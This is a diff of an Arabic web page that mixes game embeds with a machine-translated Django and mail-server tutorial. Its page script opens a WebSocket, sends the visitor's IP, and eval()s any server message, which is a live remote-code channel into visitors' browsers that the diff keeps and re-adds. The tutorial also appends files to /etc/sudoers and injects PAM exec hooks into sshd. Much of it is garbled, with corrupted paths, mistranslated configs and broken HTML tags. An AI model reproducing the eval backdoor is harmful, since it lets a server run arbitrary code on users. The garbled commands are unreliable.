@@ -140,11 +140,12 @@
 
 
 <div id="0" style="white-space: pre-wrap;">ثلاثة عشر - لعبة بطاقة عبر الإنترنت
-قم بتشغيل ثلاثة ثلاثة عشر مع صديق من خلال النقر على الرابط أدناه لإنشاء رمز دعوة أو الانضمام إلى لعبة.<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card/" title="Invite a friend">دعوة مع الكود</a>
-<a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">انضم إلى اللعبة</a>
-<script src="/static/games/threethirteen.js"></script>***</div>
+قم بتشغيل ثلاثة ثلاثة عشر مع صديق من خلال النقر على الرابط أدناه لإنشاء رمز دعوة أو الانضمام إلى لعبة.<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card-result-once-single/" title="Invite a friend">دعوة مع الكود</a>
+<a "="" class="btn btn-success" games="" href="&lt;a href=" https:="" lotteh.com="" title="Visit this link (it will take you outside of Lotte Harper)">lotteh.com/games/</a>"title =" انضم إلى لعبة "&gt; انضم إلى اللعبة
+<script src="/static/games/threethirteen.js"></script>
+</div>
 
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png" id="img0" alt="شراء على"/><p>بواسطة Daisy / <a href="/ar/three-thirteen---online-card" title="عرض المشاركة">منظر</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="شراء على Lotte Harper">يشتري</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="شراء مع العملة المشفرة Lotte Harper">شراء مع العملة المشفرة</a></p><hr>
+<div><img width="100%" height="auto" src="https://i.imgur.com/8I5qWNu.png" id="img0" alt="شراء على"/><p>بواسطة Daisy / <a href="/ar/three-thirteen---online-card" title="عرض المشاركة">منظر</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="شراء على Lotte Harper">يشتري</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="شراء مع العملة المشفرة Lotte Harper">شراء مع العملة المشفرة</a></p><hr>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -163,7 +164,17 @@
 
 <hr></div>
 
-<div id="1" style="white-space: pre-wrap;">التعلم العميق والأمان القائم على الويب القائم على الويب على سبيل المثال
+<div id="1" style="white-space: pre-wrap;">تلعب Color Sudoku Online - لعبة Colordoku مجانية
+هذه لعبة مجانية للعب لعبة Sudoku (Colordoku).<canvas class="game" id="game197"></canvas>
+<script src="/static/js/createjs.min.js"></script>
+<script src="/static/games/colordokugames.js"></script>
+<script src="/static/games/colordoku.js"></script>
+</div>
+
+<div><p>بواسطة Daisy / <a href="/ar/play-color-sudoku-online---free" title="عرض المشاركة">منظر</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="شراء على Lotte Harper">يشتري</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="شراء مع العملة المشفرة Lotte Harper">شراء مع العملة المشفرة</a></p><hr>
+</div>
+
+<div id="2" style="white-space: pre-wrap;">التعلم العميق والأمان القائم على الويب القائم على الويب على سبيل المثال
 الطبعة الثالثة
 شارلوت هاربر
 3 يوليو 2024
@@ -601,7 +612,7 @@ def register(request):
             messages.success(request, 'Welcome to the app, {}.'.format(user.username))
     return render(request, 'users/register.html', {'form': UserRegisterForm})
 </code></pre>هذا كل ما نحتاجه للحصول على مستخدم مسجل ، ولكن يجب أن يكون لدينا المزيد من المعلومات. نريد أن نعرف الوقت الذي سجل فيه المستخدم ، والوقت الذي كان عليه آخر مرة على الموقع ، وبعض المعلومات عنها ، مثل السيرة الذاتية ، والمنطقة الزمنية ، وما إلى ذلك أيضًا ، سنحتاج إلى تحديث نموذج التغذية لدينا ، النشر ، لحساب المستخدم النموذج والمنشورات السمة لكل مستخدم. من أجل القيام بذلك ، سنقوم بتحديث النماذج. لنبدأ بتحرير نموذج التغذية. يجب أن يبدو هكذا الآن:<pre class="language-python"><code>
-from django.db import models # ... كميات
+from django.db import models # ... الواردات
 from django.contrib.auth.models import User
 
 class Post(models.Model):
@@ -1248,7 +1259,7 @@ class TfaForm(forms.Form):
         'code': 'Please enter the six digit code after sending it to your phone with the button above.'
     }
 </code></pre>بعد ذلك ، دعنا ننشئ طرق العرض في المستخدمين/views.py<pre class="language-python"><code>
-# ... الواردات
+# ... كميات
 from django.http import HttpResponseRedirect
 from .forms import PhoneNumberForm, TfaForm
 
@@ -1498,7 +1509,7 @@ $('input').change(function(){
  </code></pre>ستلاحظ أن هذا نموذج بسيط إلى حد ما ، ولكن يحتوي على بعض JavaScript الذي ينشر تلقائيًا محتويات النموذج عند تحديثها. من المفيد أن يكون لديك ، لذلك يمكنك إجراء تعديلات دون الحاجة إلى الضغط على الإرسال في كل مرة.
 
 بعد ذلك ، نحتاج إلى عناوين URL التي تمثل كل هذه المشاهدات في URL URL Patters. تحرير المستخدمين/urls.py وأضف هذا الرمز:<pre class="language-python"><code>
-# ... الرمز السابق ، والواردات
+# ... الكود السابق ، المحاكات
 from django.urls import path
 from . import views
 
@@ -2035,7 +2046,7 @@ UsePAM yes
 X11Forwarding yes
 # x11displayoffset 10
 # X11USELOCALHOST نعم
-# حبوب منع الحمل نعم
+# بصياغة نعم
 PrintMotd no
 # printlastlog نعم
 # tcpkeepalive نعم
@@ -2048,7 +2059,7 @@ PrintMotd no
 # MaxStartups 10: 30: 100
 # pemittunl لا
 # chrootdirectory لا شيء
-# إصدار إضافة لا شيء
+# VersionAdendum لا شيء
 
 # لا يوجد مسار لافتة افتراضي
 Banner /etc/banner
@@ -2105,7 +2116,7 @@ sudo nano /usr/bin/ascript
 # !
 if [ ! -f /usr/bin/$1 ]; then
     sudo touch /usr/bin/$1
-    echo "# ! / bin / bash
+    echo "# !/bin/bash "&gt;&gt;/usr/ألف/$ 1
     sudo chmod a+x /usr/bin/$1
     sudo nano /usr/bin/$1
     echo $1 | sudo tee -a /etc/ascripts
@@ -2401,7 +2412,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # حقن تكوين PAM وإزالة تكوين SSH المعيب
-# sudo sed -i '-e' $ d '/etc/pam.d/sshd
+# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
 # sudo sed -i '' -و $ d ' /etc /profile
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2847,7 +2858,7 @@ nano config/etc_postfix_main.cf
 # Debian محدد: تحديد اسم الملف سيؤدي إلى الأول
 # سطر من هذا الملف لاستخدامه كاسم.  التخلف عن السداد
 # IS /etc /mailname.
-# myorigine = /etc /mailname
+# myorigin = /etc /mailname
 
 smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
 biff = no
@@ -2916,7 +2927,7 @@ nano config/etc_postfix_master.cf
 smtp      inet  n       -       y       -       -       smtpd
 # smtp inet n - y - 1 postscreen
 # SMTPD PASS - - Y - - SMTPD
-# DNSBLOG UNIX - - y - 0 dnsblog
+# Dnsblog Unix - - y - 0 dnsblog
 # tlsproxy Unix - - y - 0 tlsproxy
 # اختر واحدة: تمكين تقديم عملاء Loopback فقط ، أو لأي عميل.
 # 127.0.0.1:Submission Inet N - Y - - SMTPD
@@ -2937,11 +2948,11 @@ submission inet n       -       y       -       -       smtpd
 # -o smtpd_client_restrictions = $ mua_client_restrictions
 # -o smtpd_helo_restrictions = $ mua_helo_restrictions
 # -o smtpd_sender_restrictions = $ mua_sender_restrictions
-# -o smtpd_recipient_restrictions =
+# -o smtpd_recipient_trival =
 # -o SMTPD_RELAY_RESTRICTIONS = permot_sasl_authenticated ، رفض
 # -o milter_macro_daemon_name = نشأ
 # اختر واحدة: تمكين SMTPs لعملاء الاسترجاع فقط ، أو لأي عميل.
-# 127.0.0.1:SMTPS inet n - y - - SMTPD
+# 127.0.0.1:SMTPS inet n - y - - smtpd
 # smtps inet n - y - - smtpd
 # -o syslog_name = postfix/smtps
 # -O SMTPD_TLS_WRAPPERMODE = نعم
@@ -2957,7 +2968,7 @@ submission inet n       -       y       -       -       smtpd
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
-# QMGR UNIX N - N 300 1 OQMGR
+# QMGR UNIX N - N 300 1 OQMG
 tlsmgr    unix  -       -       y       1000?   1       tlsmgr
 rewrite   unix  -       -       y       -       -       trivial-rewrite
 bounce    unix  -       -       y       -       0       bounce
@@ -3055,7 +3066,7 @@ nano config/etc_default_opendkim
 # daemon_opts = ""
 # تغيير إلى/var/spool/postfix/run/opendkim لاستخدام مقبس UNIX مع
 # postfix في chroot:
-# rundir =/wad/spool/postfix/run/opendkim
+# Roundir =/var/spool/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # عدم التحديد لتحديد مقبس بديل
@@ -3204,7 +3215,7 @@ service dict {
 </code></pre>مرة أخرى ، تأكد من استبدال المجال في كل هذه الملفات ، Femmebabe.com ، بالمجال الذي حددته. قم بتحرير الملف التالي ، تكوين Dovecot ،<pre class="language-bash"><code>
 nano config/etc_dovecot_dovecot
 </code></pre>وأضف هذه الخطوط<pre class="language-bash"><code>
-## ملف تكوين Ovecot
+## ملف تكوين Dovecot
 
 # إذا كنت في عجلة من أمرك ، راجع http://wiki2.dovecot.org/quickconfiguration
 
@@ -3264,7 +3275,7 @@ nano config/etc_dovecot_dovecot
 # إظهار المزيد من عناوين عملية المطوّل (في PS). يظهر حاليا اسم المستخدم و
 # عنوان IP. مفيد لرؤية من يستخدمون بالفعل عمليات IMAP
 # (على سبيل المثال ، صناديق البريد المشتركة أو إذا تم استخدام نفس UID لحسابات متعددة).
-# Verbose_proctitle = لا
+# Verbose_procitle = لا
 
 # إذا تم قتل جميع العمليات عند إيقاف تشغيل عملية Dovecot Master.
 # إن تعيين هذا إلى "لا" يعني أنه يمكن ترقية DoveCot بدون
@@ -3294,7 +3305,7 @@ nano config/etc_dovecot_dovecot
 # "Proxy :: &lt;name&gt;".
 
 dict {
-  # الحصص = mysql: /andc/dovecot/dovecot-dic-sql.conf.ext
+  # الحصص = mysql: /etc/dovecot/dovecot-dics-sql.conf.ext
 }
 
 # يتم تضمين معظم التكوين الفعلي أدناه. أسماء الملفات
@@ -3401,7 +3412,7 @@ nano config/etc_default_opendkim
 # daemon_opts = ""
 # تغيير إلى/var/spool/postfix/run/opendkim لاستخدام مقبس UNIX مع
 # postfix في chroot:
-# Roundir =/var/spool/postfix/run/opendkim
+# rundir =/wad/spool/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # عدم التحديد لتحديد مقبس بديل
@@ -3575,23 +3586,14 @@ source venv/bin/activate
 <div><p>بواسطة Daisy / <a href="/ar/practical-web-based-deep" title="عرض المشاركة">منظر</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="شراء على Lotte Harper">يشتري</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="شراء مع العملة المشفرة Lotte Harper">شراء مع العملة المشفرة</a></p><hr>
 </div>
 
-<div id="2" style="white-space: pre-wrap;">اثنان لاعب لاعب Sudoku على الانترنت مجانا
+<div id="3" style="white-space: pre-wrap;">اثنان لاعب لاعب Sudoku على الانترنت مجانا
 العب ألوان تعاونية Sudoku مع صديق مجانًا.<a class="btn btn-info" href="https://lotteh.com/games/two-player-color-sudoku-online/" title="Invite a friend">دعوة صديق</a>
 <a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">انضم إلى لعبة</a>
 <script src="https://lotteh.com/static/games/colordokugames2.js"></script>
-<script src="https://lotteh.com/static/games/twoplayercolordoku.js"></script>***</div>
-
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img2" alt="شراء على"/><p>بواسطة Daisy / <a href="/ar/two-player-color-sudoku-online" title="عرض المشاركة">منظر</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="شراء على Lotte Harper">يشتري</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="شراء مع العملة المشفرة Lotte Harper">شراء مع العملة المشفرة</a></p><hr>
+<script games="" https:="" lotteh.com="" src="&lt;a href=" static="" title="Visit this link (it will take you outside of Lotte Harper)" twoplayercolordoku.js"="">lotteh.com/static/games/twoplayercolordoku.js</a>"></script>
 </div>
 
-<div id="3" style="white-space: pre-wrap;">تلعب Color Sudoku Online - لعبة Colordoku مجانية
-هذه لعبة مجانية للعب لعبة Sudoku (Colordoku).
-***<canvas class="game" id="game197"></canvas>
-<script src="/static/js/createjs.min.js"></script>
-<script src="/static/games/colordokugames.js"></script>
-<script src="/static/games/colordoku.js"></script></div>
-
-<div><p>بواسطة Daisy / <a href="/ar/play-color-sudoku-online---free" title="عرض المشاركة">منظر</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="شراء على Lotte Harper">يشتري</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="شراء مع العملة المشفرة Lotte Harper">شراء مع العملة المشفرة</a></p><hr>
+<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img3" alt="شراء على"/><p>بواسطة Daisy / <a href="/ar/two-player-color-sudoku-online" title="عرض المشاركة">منظر</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="شراء على Lotte Harper">يشتري</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="شراء مع العملة المشفرة Lotte Harper">شراء مع العملة المشفرة</a></p><hr>
 </div>
 
 <div id="4" style="white-space: pre-wrap;"><p>كيف أرتدي kitlock؟</p><p><br/></p><p>1. ابدأ بتنمية شعرك إلى الطول المطلوب. يجب أن يكون شعرك ما لا يقل عن 2-3 بوصات للحصول على أفضل النتائج.</p><p><br/></p><p>2. قسم شعرك إلى أجزاء صغيرة ، حتى باستخدام مشط. سيحدد حجم الأقسام حجم المجدلات الخاصة بك ، لذا تأكد من اختيار الحجم الذي تشعر بالراحة معه.</p><p><br/></p><p>3. ابدأ في خلفية كل قسم من الشعر عن طريق التواء وسحبه بإحكام نحو الجذور. سيؤدي ذلك إلى إنشاء عقدة في الشعر ، والتي ستشكل في نهاية المطاف في المجدل.</p><p><br/></p><p>4. تطبيق الشمع أو هلام على كل قسم من الشعر للمساعدة في الاحتفاظ بالعقدة في مكانها وتشجيع الشعر على حصيرة معًا.</p><p><br/></p><p>5. تابع الخلفية وتواء كل قسم من الشعر حتى تكمل رأسك بالكامل. يمكن أن تكون هذه العملية مستهلكة للوقت ، لذا كن صبورًا واتخذ فترات راحة حسب الحاجة.</p><p><br/></p><p>6. بمجرد أن يتم تلويع جميع شعرك وتراجعه ، دعه يجلس لبضعة أيام للسماح للعقدة بالتشديد وتشكل في المجدل.</p><p><br/></p><p>7. بعد بضعة أيام ، يمكنك البدء في التصميم والحفاظ على درجات المجرات عن طريق غسلها بشامبو خالي من البقايا واستخدام خطاف الكروشيه للمساعدة في تشديد أي عقدة فضفاضة.</p><p><br/></p><p>8. للحفاظ على Dreadlocks تبدو أنيقة ومرتبة ، فكر في استخدام وشاح أو باندانا لتغطيتها عند النوم أو في بيئات قذرة. ستساعد الصيانة والصيانة المنتظمة في الحفاظ على صحة جيدة ونابضة بالحياة.</p></div>
@@ -3772,9 +3774,9 @@ source venv/bin/activate
 </div>
 <div style="margin:auto;" class="center col-md-6 p-3 rounded mb-3 bg-white">
 <div class="mb-2" style="display: flex; justify-content: space-around;">
-<a title="شارك على Facebook" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Far%2Fnews%3F&quote=Visit%20this%20link%20on%20Glam%20Girl%20X&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
+<a title="شارك على Facebook" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Far%2Fnews%3F&quote=Three%20Thirteen%20-%20Online%20Card%20Game&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
   <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/></svg></a>
-<a title="شارك على Twitter" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Visit%20this%20link%20on%20Glam%20Girl%20X%20-&url=https://glamgirlx.com/ar/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
+<a title="شارك على Twitter" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Three%20Thirteen%20-%20Online%20Card%20Game%20-&url=https://glamgirlx.com/ar/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
   <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334q.002-.211-.006-.422A6.7 6.7 0 0 0 16 3.542a6.7 6.7 0 0 1-1.889.518 3.3 3.3 0 0 0 1.447-1.817 6.5 6.5 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.32 9.32 0 0 1-6.767-3.429 3.29 3.29 0 0 0 1.018 4.382A3.3 3.3 0 0 1 .64 6.575v.045a3.29 3.29 0 0 0 2.632 3.218 3.2 3.2 0 0 1-.865.115 3 3 0 0 1-.614-.057 3.28 3.28 0 0 0 3.067 2.277A6.6 6.6 0 0 1 .78 13.58a6 6 0 0 1-.78-.045A9.34 9.34 0 0 0 5.026 15"/>
 </svg></a>
 <a title="مشاركة على Pinterest" target="_blank" class="btn btn-xlarge btn-light" href="https://www.pinterest.com/pin/create/button/?url=https://glamgirlx.com/ar/news?" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-pinterest" viewBox="0 0 16 16" style="filter: invert(21%) sepia(58%) saturate(4534%) hue-rotate(338deg) brightness(81%) contrast(128%);">
@@ -3786,7 +3788,7 @@ source venv/bin/activate
 </div>
 <div class="mb-2" style="display: flex; justify-content: space-around;">
 <a title="مشاركة على Tumblr" target="_blank" class="btn btn-xlarge btn-light" href="http://tumblr.com/widgets/share/tool?canonicalUrl=https://glamgirlx.com/ar/news?"><img src="/media/icons/tumblr-logo.svg" width="30" height="30" alt="Tumblr" style="filter: invert(28%) sepia(8%) saturate(3348%) hue-rotate(169deg) brightness(92%) contrast(82%);"></img></a>
-<a title="مشاركة على رديت" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/ar/news?&title=Visit%20this%20link%20on%20Glam%20Girl%20X"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
+<a title="مشاركة على رديت" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/ar/news?&title=Three%20Thirteen%20-%20Online%20Card%20Game"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
   <path d="M6.167 8a.83.83 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661m1.843 3.647c.315 0 1.403-.038 1.976-.611a.23.23 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83s.83-.381.83-.83a.831.831 0 0 0-1.66 0z"/>
   <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.2.2 0 0 0-.153.028.2.2 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224q-.03.17-.029.353c0 1.795 2.091 3.256 4.669 3.256s4.668-1.451 4.668-3.256c0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165"/>
 </svg></a>
@@ -3888,32 +3890,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
